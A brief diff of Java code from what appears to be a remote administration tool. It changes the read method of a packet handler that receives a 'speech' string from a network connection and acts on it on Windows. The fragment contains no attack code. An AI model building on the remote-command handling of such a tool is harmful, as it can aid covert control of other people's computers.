@@ -11,7 +11,7 @@ import com.redpois0n.oslib.OperatingSystem;
 public class Packet76Speech extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		final String speech = Connection.instance.readLine();
 		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 			new Thread() {
